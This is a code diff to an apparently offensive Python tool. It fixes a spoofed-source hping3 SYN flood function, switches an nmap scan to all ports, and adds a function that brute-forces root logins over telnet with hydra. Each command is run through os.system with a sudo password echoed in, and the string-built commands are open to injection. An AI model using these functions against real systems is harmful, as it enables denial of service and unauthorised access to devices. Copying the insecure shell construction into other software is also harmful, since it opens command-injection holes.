@@ -21,7 +21,7 @@ def hPing3(ip, packets, pwd):
         pwd: <string> sudo password for machine running the attack
     """
 
-    command = 'hping3 -S -c ' + str(packets) +  ' --faster --rand-source' + ip
+    command = 'hping3 -S -c ' + str(packets) +  ' --faster --rand-source ' + ip
     os.system('echo %s|sudo -S %s' % (str(pwd), command))
 #end hPing3
 
@@ -48,7 +48,7 @@ def scanning(ip):
     Parameters: 
         ip: <string> ip address of device to scan
     """   
-    command = 'nmap -vv ' + ip
+    command = 'nmap -p- ' + ip
     os.system(command)
 
 #end scanning
@@ -98,9 +98,11 @@ def avacomPing(ip, target):
     time.sleep(10)
 #end avacomCommand
 
+def bruteForce(target, pwdFile, sudo):
+    command = "hydra -l root -P " + str(pwdFile) + " telnet://" + str(target)
+    os.system('echo %s|sudo -S %s' % (sudo, command))
 
 
-#avacomCommand("192.168.1.116","ping -s 5000 -c 100 192.168.1.100")
 #print("done")
 
 
